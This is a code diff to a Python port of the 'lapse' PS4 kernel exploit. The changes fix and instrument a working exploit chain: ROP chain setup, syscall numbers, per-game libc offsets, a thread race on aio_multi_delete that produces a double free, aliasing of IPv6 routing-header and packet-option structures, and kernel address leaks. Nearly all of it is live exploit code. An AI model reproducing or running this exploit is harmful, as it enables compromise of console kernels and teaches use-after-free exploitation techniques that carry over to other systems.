@@ -1,65 +1,95 @@
 import struct
 
-# if WRITING:  # dummy objects for writing code
-#     class Executable:
-#         errno = 0
-#         def __call__(self, *args, **kwargs):
-#             return 0
+WRITING = False
 
-#         def get_error_string(self):
-#             return ""
+if WRITING:  # dummy objects for writing code
+    nogc = []
 
-#     class Container:
-#         def __getattribute__(self, name):
-#             return Executable()
+    class Container:
+        def __getattribute__(self, name):
+            return Executable()
 
-#     class sc:
-#         mem = bytearray()
-#         version = ""
-#         platform = ""
-#         errno = 0
-#         libkernel_addr = 0
-#         libc_addr = 0
-#         exec_addr = 0
+    class sc:
+        mem = bytearray()
+        version = ""
+        platform = ""
+        errno = 0
+        libkernel_addr = 0
+        libc_addr = 0
+        exec_addr = 0
 
-#         syscalls = Container()
-#         functions = Container()
+        syscalls = Container()
+        functions = Container()
 
-#         @staticmethod
-#         def make_function_if_needed(name, addr):
-#             return Executable()
+        @staticmethod
+        def make_function_if_needed(name, addr):
+            return Executable()
 
-#     class ROPChain:
-#         def __init__(self, *args, **kwargs):
-#             pass
+    class ROPChain:
+        def __init__(self, *args, **kwargs):
+            pass
 
-#         def push_syscall(self, *args, **kwargs):
-#             pass
+        def push_syscall(self, *args, **kwargs):
+            pass
 
-#         def push_write_into_memory(self, *args, **kwargs):
-#             pass
+        def push_write_into_memory(self, *args, **kwargs):
+            pass
 
-#     SYSCALL = {}
-#     LIBC_OFFSETS = {}
-#     SELECTED_LIBC = {}
+        def append(self, *args, **kwargs):
+            pass
 
-#     def alloc(size):
-#         return bytearray(size)
+        def reset(self):
+            pass
 
-#     def readuint(addr, size):
-#         return 0
+    class Executable:
+        errno = 0
+        chain = ROPChain(sc)
 
-#     def get_ref_addr(data):
-#         return 0
+        def __init__(self, *args, **kwargs):
+            pass
 
-#     def readbuf(addr, size):
-#         return bytearray(size)
+        def __call__(self, *args, **kwargs):
+            return 0
 
-#     def get_cstring(data, addr=0):
-#         return ""
+        def get_error_string(self):
+            return ""
 
-#     def u64_to_i64(value):
-#         return value
+        def setup_front_chain(self):
+            pass
+
+        def setup_syscall_chain(self, *args, **kwargs):
+            pass
+
+        def setup_post_chain(self):
+            pass
+
+        def setup_back_chain(self):
+            pass
+
+        def execute(self):
+            return 0
+
+    SYSCALL = {}
+    LIBC_OFFSETS = {}
+    SELECTED_LIBC = {}
+
+    def alloc(size):
+        return bytearray(size)
+
+    def readuint(addr, size):
+        return 0
+
+    def get_ref_addr(data):
+        return 0
+
+    def readbuf(addr, size):
+        return bytearray(size)
+
+    def get_cstring(data, addr=0):
+        return ""
+
+    def u64_to_i64(value):
+        return value
 
 
 # Port of https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
@@ -1049,9 +1079,9 @@ SYSCALL["munmap"] = 0x49
 SYSCALL["mprotect"] = 0x4A
 SYSCALL["getsockopt"] = 0x76
 SYSCALL["socketpair"] = 0x87
-SYSCALL["thr_self"] = 0x1B0
-SYSCALL["thr_exit"] = 0x1AF
 SYSCALL["sched_yield"] = 0x14B
+SYSCALL["thr_exit"] = 0x1AF
+SYSCALL["thr_self"] = 0x1B0
 SYSCALL["thr_new"] = 0x1C7
 SYSCALL["rtprio_thread"] = 0x1D2
 SYSCALL["mmap"] = 477
@@ -1073,10 +1103,10 @@ SYSCALL["aio_multi_cancel"] = 0x29A
 SYSCALL["aio_submit_cmd"] = 0x29D
 SYSCALL["kexec"] = 0x295
 
-LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["setjmp"] = 0x7E0
-LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["setjmp"] = 0x7E0
-LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["longjmp"] = 0x830
-LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["longjmp"] = 0x830
+LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["setjmp"] = 0xB07E0
+LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["setjmp"] = 0xB07E0
+LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["longjmp"] = 0xB0830
+LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["longjmp"] = 0xB0830
 
 
 # sys/socket.h
@@ -1278,18 +1308,30 @@ def rop_set_rtprio(chain, prio):
 
 
 class PrimThread(object):
+    initialize = False
+    fpu_ctrl_value = 0
+    mxcsr_value = 0
+
     def __init__(self, sc, chain):
         self.sc = sc
+
+        # exit ropchain once finished
+        chain.push_syscall(SYSCALL["thr_exit"], 0)
         self.chain = chain
+
         self._ready = False
-        self.init()
+        if not PrimThread.initialize:
+            self.init()
 
     def init(self):
+        print("initializing PrimThread")
         jmp_buf = alloc(0x60)
         self.sc.functions.setjmp(jmp_buf)
 
-        self.fpu_ctrl_value = struct.unpack("<I", jmp_buf[0x40:0x44])[0]
-        self.mxcsr_value = struct.unpack("<I", jmp_buf[0x44:0x48])[0]
+        PrimThread.fpu_ctrl_value = struct.unpack("<I", jmp_buf[0x40:0x44])[0]
+        PrimThread.mxcsr_value = struct.unpack("<I", jmp_buf[0x44:0x48])[0]
+        PrimThread.initialize = True
+        print("initialized PrimThread")
 
     def prepare_structure(self):
         jmp_buf = alloc(0x60)
@@ -1297,8 +1339,8 @@ class PrimThread(object):
         # skeleton jmp_buf
         jmp_buf[0x0:0x8] = struct.pack("<Q", self.sc.exec_addr + self.sc.gadgets["ret"])
         jmp_buf[0x10:0x18] = struct.pack("<Q", self.chain.addr)
-        jmp_buf[0x40:0x44] = struct.pack("<I", self.fpu_ctrl_value)
-        jmp_buf[0x44:0x48] = struct.pack("<I", self.mxcsr_value)
+        jmp_buf[0x40:0x44] = struct.pack("<I", PrimThread.fpu_ctrl_value)
+        jmp_buf[0x44:0x48] = struct.pack("<I", PrimThread.mxcsr_value)
 
         # prep structure for thr_new
 
@@ -1306,7 +1348,7 @@ class PrimThread(object):
         tls_size = 0x40
 
         self.thr_new_args = alloc(0x80)
-        self.tid_buf = alloc(8)
+        self.tid_addr = alloc(8)
 
         cpid = alloc(8)
         stack = alloc(stack_size)
@@ -1320,8 +1362,12 @@ class PrimThread(object):
         self.thr_new_args[0x18:0x20] = struct.pack("<Q", stack_size)
         self.thr_new_args[0x20:0x28] = struct.pack("<Q", get_ref_addr(tls))
         self.thr_new_args[0x28:0x30] = struct.pack("<Q", tls_size)
-        self.thr_new_args[0x30:0x38] = struct.pack("<Q", get_ref_addr(self.tid_buf))
-        self.thr_new_args[0x38:0x40] = struct.pack("<Q", get_ref_addr(cpid))
+        self.thr_new_args[0x30:0x38] = struct.pack(
+            "<Q", get_ref_addr(self.tid_addr)
+        )  # child pid
+        self.thr_new_args[0x38:0x40] = struct.pack(
+            "<Q", get_ref_addr(cpid)
+        )  # parent pid
 
         self._ready = True
 
@@ -1329,6 +1375,7 @@ class PrimThread(object):
         if not self._ready:
             self.prepare_structure()
 
+        print("creating PrimThread via thr_new syscall")
         if (
             u64_to_i64(
                 self.sc.syscalls.thr_new(
@@ -1341,9 +1388,10 @@ class PrimThread(object):
             raise Exception(
                 "thr_new error: %d\n%s" % (self.sc.errno, self.sc.get_error_string())
             )
+        print("created PrimThread")
 
         self.ready = False
-        self.tid = struct.unpack("<Q", self.tid_buf[0:8])[0]
+        self.tid = struct.unpack("<Q", self.tid_addr[0:8])[0]
 
         return self.tid
 
@@ -1602,6 +1650,8 @@ def reset_race_state():
 def prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd):
     chain = ROPChain(sc)
 
+    chain.append(0)
+
     # set worker thread core to be the same as main thread core so they
     # will use similar per-cpu freelist bucket
     rop_pin_to_core(chain, MAIN_CORE)
@@ -1689,7 +1739,7 @@ def create_pipe():
 
 def wait_for(addr, val):
     while True:
-        curr = struct.unpack("<Q", addr[0:8])[0]
+        curr = readuint(addr, 8)
         if curr == val:
             break
 
@@ -1714,9 +1764,10 @@ def set_rthdr(sd, buf, len):
     ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, get_ref_addr(buf), len)
 
 
-def free_rthers(sds):
+def free_rthdrs(sds):
     for sd in sds:
-        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+        if sd != 0xFFFFFFFFFFFFFFFF:
+            ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 
 
 def make_aliased_rthdrs(sds):
@@ -1739,9 +1790,13 @@ def make_aliased_rthdrs(sds):
                     "aliased rthdrs at attempt: %d (found pair: %d %d)"
                     % (loop, sd_pair[0], sd_pair[1])
                 )
-                sds.remove(sd_pair[0])
-                sds.remove(sd_pair[1])
-                free_rthers(sds)
+                max_id = max(marker, i)
+                min_id = min(marker, i)
+                del sds[max_id]
+                del sds[min_id]
+                print("freeing remaining sds: %s" % sds)
+                free_rthdrs(sds)
+                print("freed remaining sds, creating new ones")
                 for _ in range(2):
                     sds.append(new_socket())
 
@@ -1750,14 +1805,25 @@ def make_aliased_rthdrs(sds):
     raise Exception("failed to make aliased rthdrs: size %s" % hex(size))
 
 
+def hexdump(data):
+    for i in range(0, len(data), 16):
+        chunk = data[i : i + 16]
+        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
+        ascii_bytes = "".join((chr(b) if 32 <= b < 127 else ".") for b in chunk)
+        print(f"{i:08x}  {hex_bytes:<48}  {ascii_bytes}")
+
+
 def race_one(request_addr, tcp_sd, sds):
     reset_race_state()
+
+    hexdump(readbuf(id(None), 0x10))
 
     sce_errs = alloc(8)
     sce_errs[0:4] = struct.pack("<I", 0xFFFFFFFF)
     sce_errs[4:8] = struct.pack("<I", 0xFFFFFFFF)
 
     pipe_read_fd, pipe_write_fd = create_pipe()
+    print("created pipe fds: %d %d" % (pipe_read_fd, pipe_write_fd))
 
     # prepare ropchain to race for aio_multi_delete
     delete_chain = prepare_aio_multi_delete_rop(
@@ -1767,22 +1833,35 @@ def race_one(request_addr, tcp_sd, sds):
     # spawn worker thread
     thr = PrimThread(sc, delete_chain)
     thr_tid = thr.run()
+    print("spawned worker thread: %s" % hex(thr_tid))
+    hexdump(readbuf(id(None), 0x10))
 
     # wait for the worker thread to ready
     wait_for(get_ref_addr(ready_signal), 1)
+    print("worker thread ready")
+
+    suspend_chain = Executable(sc, 0xF000 * 4)
+    suspend_chain.chain.reset()
+    suspend_chain.setup_front_chain()
 
     # notify worker thread to resume
-    sc.syscalls.write(pipe_write_fd, pipe_buf, 1)
+    suspend_chain.setup_syscall_chain(SYSCALL["write"], pipe_write_fd, pipe_buf, 1)
 
     # yield and hope the scheduler runs the worker next.
     # the worker will then sleep at soclose() and hopefully we run next
-    sc.syscalls.sched_yield()
+    suspend_chain.setup_syscall_chain(SYSCALL["sched_yield"])
 
     # if we get here and the worker hasn't been reran then we can delay the
     # worker's execution of soclose() indefinitely
-    suspend_res = sc.syscalls.thr_suspend_ucontext(thr_tid)
+    suspend_chain.setup_syscall_chain(SYSCALL["thr_suspend_ucontext"], thr_tid)
+
+    suspend_chain.setup_post_chain()
+    suspend_chain.setup_back_chain()
+
+    suspend_res = suspend_chain.execute()
 
     print("suspend %s: %d" % (hex(thr_tid), suspend_res))
+    hexdump(readbuf(id(None), 0x10))
 
     poll_err = alloc(4)
     aio_multi_poll(request_addr, 1, poll_err)
@@ -1796,7 +1875,7 @@ def race_one(request_addr, tcp_sd, sds):
         print("info size isn't %d: %d" % (size_tcp_info, info_size))
 
     tcp_state = struct.unpack("<B", info_buf[0:1])[0]
-    print("tcp state: %d" % tcp_state)
+    print("tcp state: %s" % hex(tcp_state))
 
     won_race = False
 
@@ -1821,14 +1900,22 @@ def race_one(request_addr, tcp_sd, sds):
         # if the code has no bugs then this isn't possible but we keep the check for easier debugging
         # NOTE: both must be equal 0 for the double free to work
         if err_main_thr != err_worker_thr:
-            raise Exception(
-                "sce_errs mismatch: %s %s" % (hex(err_main_thr), hex(err_worker_thr))
-            )
+            raise Exception("bad won")
 
         # RESTORE: double freed memory has been reclaimed with harmless data
         # PANIC: 0x80 malloc zone pointers aliased
-        return make_aliased_rthdrs(sds)
+        sd_pair = make_aliased_rthdrs(sds)
+        if sd_pair is not None:
+            print("made aliased rthdrs (%d, %d)" % (sd_pair[0], sd_pair[1]))
+            sc.syscalls.close(pipe_read_fd)
+            sc.syscalls.close(pipe_write_fd)
+            print("closed pipe fds after winning race")
+            return sd_pair
+        else:
+            raise Exception("bad aliased rthdrs")
 
+    sc.syscalls.close(pipe_read_fd)
+    sc.syscalls.close(pipe_write_fd)
     return None
 
 
@@ -1921,11 +2008,14 @@ def double_free_reqs2(sds):
         sc.syscalls.close(sd_client)
 
         res = race_one(req_addr, sd_conn, sds)
+        print("race_one done")
 
         # MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
         # twice. this will leave one request undeleted
         aio_multi_delete(get_ref_addr(aio_ids), num_reqs)
+        print("aio_multi_delete done")
         sc.syscalls.close(sd_conn)
+        print("closed sd_conn")
 
         if res is not None:
             print("won race at attempt: %d" % (i + 1))
@@ -1966,7 +2056,7 @@ def free_evf(id):
         )
 
 
-def verity_reqs2(addr, cmd):
+def verify_reqs2(addr, cmd):
     # reqs2.ar2_cmd
     if readuint(addr, 4) != cmd:
         return False
@@ -2160,7 +2250,7 @@ def leak_kernel_addrs(sd_pair, sds):
         reqs2_off, fake_reqs3_off = None, None
 
         for off in range(0, buflen - 1, 0x80):
-            if not reqs2_off and verity_reqs2(get_ref_addr(buf) + off, AIO_CMD_WRITE):
+            if not reqs2_off and verify_reqs2(get_ref_addr(buf) + off, AIO_CMD_WRITE):
                 reqs2_off = off
             if not fake_reqs3_off:
                 marker = struct.unpack("<I", buf[off + 4 : off + 8])[0]
@@ -2172,7 +2262,7 @@ def leak_kernel_addrs(sd_pair, sds):
             print("found reqs2 and fake reqs3 at attempt: %d" % (i + 1))
             fake_reqs3_sd = sds[sd_idx]
             sds.remove(fake_reqs3_sd)
-            free_rthers(sds)
+            free_rthdrs(sds)
             sds.append(new_socket())
             break
 
@@ -2253,23 +2343,26 @@ def make_aliased_pktopts(sds):
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
 
         for i in range(len(sds)):
-            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
-            marker = struct.unpack("<I", tclass[0:4])[0]
-            if marker != i:
-                sd_pair = (sds[i], sds[marker])
-                print(
-                    "aliased pktopts at attempt: %d (found pair: %d %d)"
-                    % (loop, sd_pair[0], sd_pair[1])
-                )
-                sds.remove(marker)
-                sds.remove(i)
-                free_rthers(sds)
-                for _ in range(2):
-                    sock_fd = new_socket()
-                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
-                    sds.append(sock_fd)
+            if sds[i] != 0xFFFFFFFFFFFFFFFF:
+                gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
+                marker = struct.unpack("<I", tclass[0:4])[0]
+                if marker != i:
+                    sd_pair = (sds[i], sds[marker])
+                    print(
+                        "aliased pktopts at attempt: %d (found pair: %d %d)"
+                        % (loop, sd_pair[0], sd_pair[1])
+                    )
+                    sds.remove(marker)
+                    sds.remove(i)
+                    free_rthdrs(sds)
+                    for _ in range(2):
+                        sock_fd = new_socket()
+                        ssockopt(
+                            sock_fd, IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4
+                        )
+                        sds.append(sock_fd)
 
-                return sd_pair
+                    return sd_pair
 
         for sd in sds:
             ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
@@ -2320,7 +2413,7 @@ def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_a
     states = alloc(4 * num_elems)
     addr_cache = []
     for i in range(num_batches):
-        addr_cache.append(get_ref_addr(aio_ids) + (i * num_elems) << 2)
+        addr_cache.append(get_ref_addr(aio_ids) + ((i * num_elems) << 2))
 
     print("start overwrite AIO queue entry with rthdr loop")
 
